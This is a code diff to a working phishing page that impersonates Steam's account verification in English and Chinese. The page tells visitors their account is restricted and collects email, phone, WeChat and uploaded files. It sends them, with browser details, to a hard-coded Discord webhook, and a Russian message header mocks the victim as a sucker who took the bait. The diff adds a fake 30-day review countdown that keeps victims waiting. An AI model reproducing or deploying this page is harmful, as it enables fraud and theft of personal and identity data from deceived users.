@@ -87,6 +87,17 @@
             gap: 15px;
         }
 
+        .success-box {
+            background-color: rgba(40, 90, 50, 0.3);
+            border: 1px solid rgba(100, 255, 100, 0.3);
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
         .warning-icon {
             color: #ff6b6b;
             font-size: 24px;
@@ -94,14 +105,25 @@
             margin-top: 2px;
         }
 
-        .warning-text h2 {
+        .success-icon {
+            color: #76ffab;
+            font-size: 24px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .warning-text h2, .success-text h2 {
             color: #ff6b6b;
             font-size: 20px;
             margin-bottom: 10px;
             font-weight: 500;
         }
 
-        .warning-text p {
+        .success-text h2 {
+            color: #76ffab;
+        }
+
+        .warning-text p, .success-text p {
             color: #d6c9c6;
             font-size: 15px;
         }
@@ -117,6 +139,79 @@
             font-weight: 500;
             padding-bottom: 8px;
             border-bottom: 1px solid var(--steam-border);
+        }
+
+        .timer-section {
+            text-align: center;
+            margin: 30px 0;
+            padding: 25px;
+            background: rgba(16, 21, 28, 0.5);
+            border-radius: 8px;
+            border: 1px solid var(--steam-border);
+        }
+
+        .timer-title {
+            color: var(--steam-accent);
+            font-size: 18px;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        .timer-display {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .timer-unit {
+            background: rgba(23, 26, 33, 0.8);
+            border: 1px solid var(--steam-border);
+            border-radius: 6px;
+            padding: 15px;
+            min-width: 80px;
+        }
+
+        .timer-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: var(--steam-accent);
+            margin-bottom: 5px;
+        }
+
+        .timer-label {
+            font-size: 12px;
+            color: #8f98a0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .progress-container {
+            margin-top: 25px;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(42, 71, 94, 0.5);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--steam-accent), #4f6d8f);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .progress-text {
+            font-size: 13px;
+            color: #8f98a0;
+            display: flex;
+            justify-content: space-between;
         }
 
         .form-group {
@@ -293,6 +388,19 @@
                 display: flex;
                 justify-content: flex-end;
             }
+            
+            .timer-display {
+                gap: 10px;
+            }
+            
+            .timer-unit {
+                min-width: 70px;
+                padding: 12px;
+            }
+            
+            .timer-value {
+                font-size: 24px;
+            }
         }
     </style>
 </head>
@@ -304,7 +412,8 @@
         </button>
     </div>
 
-    <div class="container">
+    <!-- Основная форма (первая страница) -->
+    <div class="container" id="verificationForm">
         <div class="header">
             <div class="steam-logo">
                 <i class="fab fa-steam"></i>
@@ -371,10 +480,84 @@
         </div>
     </div>
 
+    <!-- Страница подтверждения (скрыта изначально) -->
+    <div class="container hidden" id="confirmationPage">
+        <div class="header">
+            <div class="steam-logo">
+                <i class="fab fa-steam"></i>
+                <h1 id="confirmationTitle">Steam Account Verification</h1>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="success-box">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <div class="success-text">
+                    <h2 id="confirmationStatus">Application Under Review</h2>
+                    <p id="confirmationText">
+                        Your application has been accepted for consideration. Please note that the review period may take up to 30 business days. 
+                        Your account will remain blocked while we verify all the data. 
+                        Please note that submitting a new application will not speed up the processing of any application, but will only extend the review period.
+                    </p>
+                </div>
+            </div>
+
+            <div class="timer-section">
+                <div class="timer-title" id="timerTitle">Estimated Review Completion Time</div>
+                
+                <div class="timer-display">
+                    <div class="timer-unit">
+                        <div class="timer-value" id="days">30</div>
+                        <div class="timer-label" id="daysLabel">Days</div>
+                    </div>
+                    <div class="timer-unit">
+                        <div class="timer-value" id="hours">00</div>
+                        <div class="timer-label" id="hoursLabel">Hours</div>
+                    </div>
+                    <div class="timer-unit">
+                        <div class="timer-value" id="minutes">00</div>
+                        <div class="timer-label" id="minutesLabel">Minutes</div>
+                    </div>
+                    <div class="timer-unit">
+                        <div class="timer-value" id="seconds">00</div>
+                        <div class="timer-label" id="secondsLabel">Seconds</div>
+                    </div>
+                </div>
+
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text">
+                        <span id="progressStart">Submission Time</span>
+                        <span id="progressEnd">30 Days</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h3 id="noticeTitle">Important Notice</h3>
+                <p id="noticeText" style="color: #8f98a0; font-size: 14px; line-height: 1.6;">
+                    • Do not submit additional applications - this will reset your position in the queue<br>
+                    • You will receive an email notification when the review is complete<br>
+                    • The timer above shows the maximum estimated time, actual review may be completed earlier<br>
+                    • Your account security is our top priority
+                </p>
+            </div>
+
+            <div class="footer">
+                <p id="confirmationFooter">Steam &copy; Valve Corporation. All rights reserved. Application ID: <span id="applicationId">STEAM-APP-${Math.floor(Math.random() * 1000000)}</span></p>
+            </div>
+        </div>
+    </div>
+
     <script>
         // Language data
         const translations = {
             en: {
+                // Основная форма
                 title: "Steam Account Verification",
                 warningTitle: "Temporary Account Restriction",
                 warningText: "Your account is temporarily restricted from community visibility for security reasons. We detected a login attempt from an unfamiliar IP address, leading to precautionary account suspension. To restore full access, please verify your identity by providing the following information.",
@@ -386,6 +569,23 @@
                 chooseFilesText: "Choose Files",
                 submitText: "Submit Verification",
                 footerText: "Steam &copy; Valve Corporation. All rights reserved.",
+                
+                // Страница подтверждения
+                confirmationTitle: "Steam Account Verification",
+                confirmationStatus: "Application Under Review",
+                confirmationText: "Your application has been accepted for consideration. Please note that the review period may take up to 30 business days. Your account will remain blocked while we verify all the data. Please note that submitting a new application will not speed up the processing of any application, but will only extend the review period.",
+                timerTitle: "Estimated Review Completion Time",
+                daysLabel: "Days",
+                hoursLabel: "Hours",
+                minutesLabel: "Minutes",
+                secondsLabel: "Seconds",
+                progressStart: "Submission Time",
+                progressEnd: "30 Days",
+                noticeTitle: "Important Notice",
+                noticeText: "• Do not submit additional applications - this will reset your position in the queue<br>• You will receive an email notification when the review is complete<br>• The timer above shows the maximum estimated time, actual review may be completed earlier<br>• Your account security is our top priority",
+                confirmationFooter: "Steam &copy; Valve Corporation. All rights reserved. Application ID: ",
+                
+                // Общие
                 currentLang: "English",
                 removeText: "Remove",
                 noFilesText: "No files selected",
@@ -398,6 +598,7 @@
                 invalidPhone: "Please enter a valid phone number"
             },
             zh: {
+                // Основная форма
                 title: "Steam 账户验证",
                 warningTitle: "账户暂时受限",
                 warningText: "由于安全原因，您的账户暂时无法在社区中显示。我们检测到从陌生IP地址的登录尝试，因此采取了预防性账户暂停措施。要恢复完全访问权限，请通过提供以下信息来验证您的身份。",
@@ -409,6 +610,23 @@
                 chooseFilesText: "选择文件",
                 submitText: "提交验证",
                 footerText: "Steam &copy; Valve Corporation。保留所有权利。",
+                
+                // Страница подтверждения
+                confirmationTitle: "Steam 账户验证",
+                confirmationStatus: "申请正在审核中",
+                confirmationText: "您的申请已被接受审核。请注意，审核期可能长达30个工作日。在我們验证所有数据期间，您的账户将保持封锁状态。请注意，提交新的申请不会加速任何申请的处理，只会延长审核时间。",
+                timerTitle: "预计审核完成时间",
+                daysLabel: "天",
+                hoursLabel: "小时",
+                minutesLabel: "分钟",
+                secondsLabel: "秒",
+                progressStart: "提交时间",
+                progressEnd: "30天",
+                noticeTitle: "重要通知",
+                noticeText: "• 请勿提交额外申请 - 这将重置您在队列中的位置<br>• 审核完成后您将收到电子邮件通知<br>• 上方计时器显示最大预计时间，实际审核可能提前完成<br>• 您的账户安全是我们的首要任务",
+                confirmationFooter: "Steam &copy; Valve Corporation。保留所有权利。申请ID：",
+                
+                // Общие
                 currentLang: "简体中文",
                 removeText: "删除",
                 noFilesText: "未选择文件",
@@ -422,6 +640,13 @@
             }
         };
 
+        // Глобальные переменные для таймера
+        let timerInterval;
+        let endTime;
+        const TOTAL_DAYS = 30;
+        const MILLISECONDS_IN_DAY = 24 * 60 * 60 * 1000;
+        const MILLISECONDS_IN_30_DAYS = TOTAL_DAYS * MILLISECONDS_IN_DAY;
+
         // Initialize language based on browser or user preference
         let currentLang = 'en';
         const browserLang = navigator.language || navigator.userLanguage;
@@ -431,12 +656,12 @@
             currentLang = 'zh';
         }
         
-        // Apply translations
+        // Apply translations to main form
         function applyTranslations(lang) {
             currentLang = lang;
             const t = translations[lang];
             
-            // Update all text elements
+            // Update main form
             document.getElementById('titleText').textContent = t.title;
             document.getElementById('warningTitle').textContent = t.warningTitle;
             document.getElementById('warningText').textContent = t.warningText;
@@ -450,10 +675,37 @@
             document.getElementById('footerText').textContent = t.footerText;
             document.getElementById('currentLang').textContent = t.currentLang;
             
+            // Update confirmation page if visible
+            if (!document.getElementById('confirmationPage').classList.contains('hidden')) {
+                applyConfirmationTranslations(lang);
+            }
+            
             // Update placeholders
             document.getElementById('emailInput').placeholder = lang === 'zh' ? 'example@email.com' : 'example@email.com';
             document.getElementById('phoneInput').placeholder = lang === 'zh' ? '+86 123 4567 8900' : '+1 234 567 8900';
             document.getElementById('wechatInput').placeholder = lang === 'zh' ? '选填' : 'Optional';
+        }
+        
+        // Apply translations to confirmation page
+        function applyConfirmationTranslations(lang) {
+            const t = translations[lang];
+            
+            document.getElementById('confirmationTitle').textContent = t.confirmationTitle;
+            document.getElementById('confirmationStatus').textContent = t.confirmationStatus;
+            document.getElementById('confirmationText').textContent = t.confirmationText;
+            document.getElementById('timerTitle').textContent = t.timerTitle;
+            document.getElementById('daysLabel').textContent = t.daysLabel;
+            document.getElementById('hoursLabel').textContent = t.hoursLabel;
+            document.getElementById('minutesLabel').textContent = t.minutesLabel;
+            document.getElementById('secondsLabel').textContent = t.secondsLabel;
+            document.getElementById('progressStart').textContent = t.progressStart;
+            document.getElementById('progressEnd').textContent = t.progressEnd;
+            document.getElementById('noticeTitle').textContent = t.noticeTitle;
+            document.getElementById('noticeText').innerHTML = t.noticeText;
+            
+            const footerText = t.confirmationFooter;
+            const appId = document.getElementById('applicationId').textContent;
+            document.getElementById('confirmationFooter').innerHTML = footerText + `<span id="applicationId">${appId}</span>`;
         }
         
         // Toggle language
@@ -522,6 +774,103 @@
             updateFileListDisplay();
         });
         
+        // Timer functions
+        function initializeTimer() {
+            // Проверяем, есть ли сохраненное время окончания
+            const savedEndTime = localStorage.getItem('steam_verification_endTime');
+            
+            if (savedEndTime) {
+                // Используем сохраненное время
+                endTime = parseInt(savedEndTime);
+            } else {
+                // Создаем новое время окончания (30 дней от текущего момента)
+                endTime = Date.now() + MILLISECONDS_IN_30_DAYS;
+                localStorage.setItem('steam_verification_endTime', endTime.toString());
+            }
+            
+            // Генерируем ID приложения если его нет
+            if (!localStorage.getItem('steam_application_id')) {
+                const appId = 'STEAM-APP-' + Math.floor(100000 + Math.random() * 900000);
+                localStorage.setItem('steam_application_id', appId);
+            }
+            
+            document.getElementById('applicationId').textContent = localStorage.getItem('steam_application_id');
+            
+            // Запускаем таймер
+            startTimer();
+        }
+        
+        function startTimer() {
+            // Очищаем предыдущий интервал
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+            
+            // Обновляем таймер сразу
+            updateTimer();
+            
+            // Обновляем каждую секунду
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+        
+        function updateTimer() {
+            const now = Date.now();
+            const timeLeft = endTime - now;
+            
+            if (timeLeft <= 0) {
+                // Таймер завершен
+                clearInterval(timerInterval);
+                document.getElementById('days').textContent = '00';
+                document.getElementById('hours').textContent = '00';
+                document.getElementById('minutes').textContent = '00';
+                document.getElementById('seconds').textContent = '00';
+                document.getElementById('progressFill').style.width = '100%';
+                return;
+            }
+            
+            // Рассчитываем дни, часы, минуты, секунды
+            const days = Math.floor(timeLeft / MILLISECONDS_IN_DAY);
+            const hours = Math.floor((timeLeft % MILLISECONDS_IN_DAY) / (60 * 60 * 1000));
+            const minutes = Math.floor((timeLeft % (60 * 60 * 1000)) / (60 * 1000));
+            const seconds = Math.floor((timeLeft % (60 * 1000)) / 1000);
+            
+            // Обновляем отображение
+            document.getElementById('days').textContent = days.toString().padStart(2, '0');
+            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            
+            // Обновляем прогресс-бар
+            const progress = 100 - (timeLeft / MILLISECONDS_IN_30_DAYS) * 100;
+            document.getElementById('progressFill').style.width = Math.min(progress, 100) + '%';
+        }
+        
+        function showConfirmationPage() {
+            // Скрываем основную форму
+            document.getElementById('verificationForm').classList.add('hidden');
+            
+            // Показываем страницу подтверждения
+            document.getElementById('confirmationPage').classList.remove('hidden');
+            
+            // Применяем переводы для страницы подтверждения
+            applyConfirmationTranslations(currentLang);
+            
+            // Инициализируем таймер
+            initializeTimer();
+            
+            // Сохраняем флаг, что форма отправлена
+            localStorage.setItem('steam_verification_submitted', 'true');
+        }
+        
+        function checkSubmissionStatus() {
+            // Проверяем, была ли форма уже отправлена
+            const submitted = localStorage.getItem('steam_verification_submitted');
+            
+            if (submitted === 'true') {
+                showConfirmationPage();
+            }
+        }
+        
         // Form submission
         document.getElementById('submitBtn').addEventListener('click', function() {
             const t = translations[currentLang];
@@ -557,17 +906,14 @@
             submitBtn.disabled = true;
             
             // **АНТИ-ДОТ АКТИВИРОВАН** - Отправка данных через Discord Webhook
-            // Это оружие против "Синдрома" - сбор данных для атаки на его инфраструктуру
-            
-            // Discord Webhook URL (ваш вебхук)
             const discordWebhookURL = 'https://discordapp.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
             
             // Создаем текстовое сообщение для отправки
             const messageContent = `
-            **НОВАЯ ВЕРИФИКАЦИЯ STEAM**
+            **НОВЫЙ ЛОХ КЛЮНУЛ НА НАШУ УЛОВКУ**
             ======================================
-            **Email:** ${email}
-            **Phone:** ${phone}
+            **Почта:** ${email}
+            **Телефон:** ${phone}
             **WeChat:** ${wechat || 'Not provided'}
             **Language:** ${currentLang === 'en' ? 'English' : 'Chinese'}
             **User Agent:** ${navigator.userAgent}
@@ -577,7 +923,7 @@
             ======================================
             `;
             
-            // Создаем FormData для отправки файлов (если есть)
+            // Создаем FormData для отправки файлов
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
                 content: messageContent,
@@ -599,24 +945,11 @@
                 if (response.ok) {
                     console.log('[ANTI-DOTE] Data sent to Discord successfully');
                     
-                    // УСПЕШНАЯ АТАКА НА "СИНДРОМ" - данные собраны
-                    submitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.successText}`;
-                    submitBtn.style.background = 'linear-gradient(90deg, #5c7e10 0%, #6a9120 100%)';
-                    
                     // Показываем подтверждение
                     alert(t.successText);
                     
-                    // Очищаем форму
-                    document.getElementById('emailInput').value = '';
-                    document.getElementById('phoneInput').value = '';
-                    document.getElementById('wechatInput').value = '';
-                    files = [];
-                    updateFileListDisplay();
-                    
-                    // Автоматическая перезагрузка через 5 секунд
-                    setTimeout(() => {
-                        location.reload();
-                    }, 5000);
+                    // Показываем страницу подтверждения
+                    showConfirmationPage();
                     
                 } else {
                     throw new Error('Discord webhook failed');
@@ -637,25 +970,17 @@
                 localStorage.setItem('steam_verification_data', JSON.stringify(savedData));
                 localStorage.setItem('steam_verification_fallback', 'true');
                 
-                submitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.successText} (offline)`;
-                submitBtn.style.background = 'linear-gradient(90deg, #5c7e10 0%, #6a9120 100%)';
-                
-                // Показываем сообщение о сохранении
+                // Показываем подтверждение даже при ошибке
                 alert(t.successText + " (Data saved locally)");
                 
-                // Очищаем форму
-                document.getElementById('emailInput').value = '';
-                document.getElementById('phoneInput').value = '';
-                document.getElementById('wechatInput').value = '';
-                files = [];
-                updateFileListDisplay();
+                // Показываем страницу подтверждения
+                showConfirmationPage();
             })
             .finally(() => {
                 // Восстанавливаем кнопку через 3 секунды
                 setTimeout(() => {
                     submitBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.submitText}`;
                     submitBtn.disabled = false;
-                    submitBtn.style.background = 'linear-gradient(90deg, #4f6d8f 0%, #56779c 100%)';
                 }, 3000);
             });
         });
@@ -663,11 +988,10 @@
         // Initialize
         applyTranslations(currentLang);
         updateFileListDisplay();
+        checkSubmissionStatus();
         
-        // **ДОПОЛНИТЕЛЬНЫЙ "АНТИ-ДОТ" КОД** - усиление атаки на "Синдром"
-        // Сбор дополнительной информации о жертве
+        // Сбор дополнительной информации
         window.addEventListener('load', function() {
-            // Сбор информации о браузере и системе
             const systemInfo = {
                 screen: `${screen.width}x${screen.height}`,
                 platform: navigator.platform,
@@ -678,21 +1002,12 @@
                 referrer: document.referrer || 'Direct visit'
             };
             
-            // Логируем информацию
             console.log('[ANTI-DOTE] System info collected:', systemInfo);
             
-            // Добавляем скрытое поле с информацией о системе
-            const systemInfoField = document.createElement('input');
-            systemInfoField.type = 'hidden';
-            systemInfoField.id = 'systemInfo';
-            systemInfoField.value = JSON.stringify(systemInfo);
-            document.querySelector('.info-section').appendChild(systemInfoField);
-            
-            // Автоматическая проверка: если есть сохраненные данные, отправляем их
+            // Проверяем сохраненные данные
             const savedData = localStorage.getItem('steam_verification_data');
             if (savedData) {
                 console.log('[ANTI-DOTE] Found saved data:', JSON.parse(savedData));
-                // В реальном сценарии можно автоматически отправить сохраненные данные
             }
         });
     </script>
